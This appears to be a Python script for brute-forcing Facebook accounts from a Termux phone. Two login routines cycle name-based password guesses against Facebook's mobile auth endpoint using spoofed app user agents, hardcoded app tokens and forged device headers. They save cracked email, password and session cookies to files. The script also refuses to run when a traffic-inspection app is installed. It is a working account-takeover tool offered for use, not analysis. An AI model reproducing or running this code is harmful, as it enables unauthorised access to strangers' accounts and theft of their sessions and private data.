import os
import random
from time import sleep
import requests, json, time, re, sys, uuid, string, subprocess, zlib, base64, hashlib
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
try:
    import pycurl
    from io import BytesIO
except:
    os.system('pip install pycurl > /dev/null')
    import pycurl
    from io import BytesIO
try:
    import requests
except:
    os.system('pip install requests chardet idna certifi urllib3 -y > /dev/null')
    os.system("clear")
    exit("\033[1;37m[\033[1;31m=\033[1;37m]\033[1;31mSOMETHING ERROR ! \033[1;37m ")
try:
    import bs4
except:
    os.system('pip install bs4 > /dev/null')
try:
    from licensing.models import *
    from licensing.methods import Key, Helpers
except:
    os.system("pip install licensing > /dev/null")

#-----------(COLOUR CODE)---------#
yellow = "\x1b[38;5;208m"
black = "\033[1;30m"
rad = "\033[1;31m"
green = "\033[1;32m"
yelloww = "\033[1;33m"
blue = "\033[38;5;6m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"

#__________________[ COLOUR ]__________________#
W = '\x1b[1;97m'
Y = '\033[1;33m'
G = '\033[1;32m'
B = '\033[1;36m'
R = '\033[1;31m'
G2 = '\033[1;36m'
G3 = '\033[1;33m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
M = '\x1b[38;5;205m'

#____________[SECURITY BOX]_____________#
try:
    os.system('rm -rf /sdcard/.txt')
    os.system('clear')
    open('/sdcard/.txt', 'w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"{W}[{G}≍{W}] {G}PLEASE ALLOW STORAGE PERMISSION FOR SAVE FILE THEN RUN AGAIN")
    os.system('termux-setup-storage')
    os.system('clear')
    exit(f"{W}[{G}≍{W}] {G}RUN AGAIN THIS TOOL !!")
try:
    fileee = os.listdir("/sdcard/Android/data/")
    if 'com.httpcanary.pro' in fileee:
        print('Please uninstall http canary from your device')
        exit()
except:
    pass

#────[FIRE-DEF]────#
def mitul():
    application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
    application_version_code = str(random.randint(000000000, 999999999))
    android_version = str(random.randrange(6, 13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111, 999)}'
    build = random.choice(["OPD2302.", "SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; BLU Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=720,height=1208};'+f'FBLC/en_US;FBRV;FBRV/{str(application_version_code)};FBCR/HO_mobile;FBMF/Sony;FBBD/Sony;FBPN/{str(fbs)};FBDV/D2502;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
    return ua

#────[User Agent]────#
def ripon1():
    # katana
    END = "[FBAN/FB4A;FBAV/779.0.0.30.91;FBBV/71608355;FBDM/{density=2.90,width=1080,height=2200};FBLC/en_GB;FBRV/844511408;FBCR/zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/G3112;FBSV/10;FBOP/19;FBCA/armeabi v7a:armeabi;]"
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model3)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + END
    return ua

model3 = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020')

def arafat2():
    # orca
    END = '[FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(kkkkki)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + END
    return ua

kkkkki = random.choice(['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'SM-S918B', 'SM-M146B', 'SM-A346B', 'SM-A245F', 'SM-A145R', 'SM-G955F', 'SM-A205GN', 'SM-A505GN', 'SM-N9005', 'SM-A205U', 'SC-02L', 'SM-J100H', 'SM-J200H', 'SM-J320H', 'SM-J400F', 'SM-J530F', 'SM-G610F', 'SM-M326B', 'SM-M426B', 'SM-G900FD', 'SM-S926U', 'SC-51B', 'SM-G981V', 'SM-G970F', 'SM-M625F', 'SM-M546B', 'SM-M536B'])

def ripon3():
    # katana
    ua = f'[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/496.0.0.40.65;FBBV/458215243;[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=1080,height=2208};FBLC/en_US;FBRV/557952455;FBCR/Orange EG;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X6812;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ua

def ripon4():
    ua = "[FBAN/FB4A;FBAV/" + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ";FBBV/" + str(random.randint(4000000, 5000000)) + ";[FBAN/FB4A;FBAV/496.0.0.40.65;FBBV/458215243;[FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1440};FBLC/es_LA;FBRV/542881474;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g22;FBSV/12;FBOP/19;FBCA/arm64-v8a:;]"
    return ua

def ripon5():
    # orca
    ua = f"[FBAN/Orca-Android;FBAV/" + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ";FBBV/" + str(random.randint(4000000, 5000000)) + ";[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;] FBBK/1"
    return ua

def ripon6():
    ua = "[FBAN/FB4A;FBAV/" + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ";FBBV/" + str(random.randint(4000000, 5000000)) + ";[FBAN/FB4A;FBAV/66.0.0.0.85;FBBV/23262261;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/MTN Cameroon;FBMF/Royal;FBBD/Royal;FBPN/com.facebook.katana;FBDV/Royal R2;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua

def filemax():
    model = random.choice(['SM-S918B', 'SM-M146B', 'SM-A346B', 'SM-A245F', 'SM-A145R', 'SM-G955F', 'SM-A205GN', 'SM-A505GN', 'SM-N9005', 'SM-A205U',
                           'SC-02L', 'SM-J100H', 'SM-J200H', 'SM-J320H', 'SM-J400F', 'SM-J530F', 'SM-G610F', 'SM-M326B',
                           'SM-M426B', 'SM-G900FD', 'SM-S926U', 'SC-51B', 'SM-G981V', 'SM-G970F', 'SM-M625F', 'SM-M546B',
                           'SM-M536B', 'SM-M526BR', 'SM-M515F', 'GT-Y8750', 'SM-G925F', 'SM-G950U', 'Z987', 'SM-A720F', 'GT-I9505',
                           'SM-G900F', 'SM-G900I', 'SM-G900M', 'SM-G900T', 'SM-G900W8', 'SM-G900H', 'SM-G900FD', 'SM-G900P',
                           'SM-G900A', 'SC-04F', 'SM-G9008W', 'SM-G900L', 'SM-G900FQ', 'SM-G900K', 'SM-G900S', 'SCL23',
                           'SM-G900D', 'SM-G900MD', 'SM-G900V', 'SM-G900T3', 'SM-G900T1', 'SM-G9008V', 'SM-G9006W',
                           'SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M',
                           'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F', 'SM-A720F'])
    END = '[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(8, 14)}; {model} Build/RP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + END
    return ua

def rrr6():
    # orca
    END = '[FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(kkkkki)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + END
    return ua

# Global variables initialization
loop = 0
oks = []
cps = []
id_list = []
ck = []

# Main function placeholder
def __A_x_M_():
    print(f"{W}[{G}MAGIC{W}] Tool initialized successfully")
    print(f"{W}[{G}INFO{W}] Starting execution...")
    # Add your main code here

# Login method 5
def m5(ids, names, passlist):
    try:
        global oks, cps, loop
        bi = random.choice([W, G, Y, B, X, M, R])
        sys.stdout.write(f'\r\r{white}[{green}MAGIC-M5{white}]{green} %s {white}[{green}OK:%s{white}]{green} \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fs = names.split(' ')[0]
        try:
            ls = names.split(' ')[1]
        except:
            ls = fs
        for pw in passlist:
            pas = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', names).replace('name', names.lower())
            with requests.Session() as session:
                data = {"adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": ids,
                        "password": pas,
                        "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_PH",
                        "client_country_code": "PH",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ripon5(),
                           'Content-Type': 'application/x-www-form-urlencoded',
                           'Host': 'graph.facebook.com',
                           'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                           'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                           'X-FB-Connection-Type': 'MOBILE.LTE',
                           'X-Tigon-Is-Retry': 'False',
                           'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                           'x-fb-device-group': '5120',
                           'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                           'X-FB-Request-Analytics-Tags': 'graphservice',
                           'X-FB-HTTP-Engine': 'Liger',
                           'X-FB-Client-IP': 'True',
                           'X-FB-Server-Cluster': 'True',
                           'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = session.post("https://api.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                    print(f"\r\r{W}[{G}MAGIC-OK{W}]{G} {ids} {R}• {G}{pas} ")
                    print(f"\033[1;37m[\033[1;32mCOOKIE\033[1;37m] = \033[1;36m{ckkk}")
                    oks.append(ids)
                    open('/sdcard/MAGIC-OK-M5-COOKIES.txt', 'a').write(ids + '|' + pas + '|' + ckkk + '\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    cps.append(ids)
                    open('/sdcard/MAGIC-CP.txt', 'a').write(ids + '|' + pas + '\n')
                else:
                    continue
        loop += 1
    except requests.exceptions.ConnectionError:
        m5(ids, names, passlist)
    except Exception as e:
        pass

# Login method 6
def m6(ids, names, passlist):
    try:
        global oks, cps, loop
        bi = random.choice([W, G, Y, B, X, M, R])
        sys.stdout.write(f'\r\r{white}[{green}MAGIC-M6{white}]{green} %s {white}[{green}OK:%s{white}]{green} \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fs = names.split(' ')[0]
        try:
            ls = names.split(' ')[1]
        except:
            ls = fs
        for pw in passlist:
            pas = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', names).replace('name', names.lower())
            with requests.Session() as session:
                data = {"adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": ids,
                        "password": pas,
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_GB",
                        "client_country_code": "GB",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': rrr6(),
                           'Content-Type': 'application/x-www-form-urlencoded',
                           'Host': 'graph.facebook.com',
                           'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                           'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                           'X-FB-Connection-Type': 'MOBILE.LTE',
                           'X-Tigon-Is-Retry': 'False',
                           'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                           'x-fb-device-group': '5120',
                           'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                           'X-FB-Request-Analytics-Tags': 'graphservice',
                           'X-FB-HTTP-Engine': 'Liger',
                           'X-FB-Client-IP': 'True',
                           'X-FB-Server-Cluster': 'True',
                           'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = session.post("https://graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                    print(f"\r\r{W}[{G}MAGIC-OK{W}]{G} {ids} {R}• {G}{pas} ")
                    print(f"\033[1;37m[\033[1;32mCOOKIE\033[1;37m] = \033[1;36m{ckkk}")
                    print(f'\033[1;37m──────────────────────────────────────────────────')
                    oks.append(ids)
                    open('/sdcard/MAGIC-OK-M6-COOKIES.txt', 'a').write(ids + '|' + pas + '|' + ckkk + '\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    cps.append(ids)
                    open('/sdcard/MAGIC-CP.txt', 'a').write(ids + '|' + pas + '\n')
                else:
                    continue
        loop += 1
    except requests.exceptions.ConnectionError:
        m6(ids, names, passlist)
    except Exception as e:
        pass

if __name__ == '__main__':
    __A_x_M_()
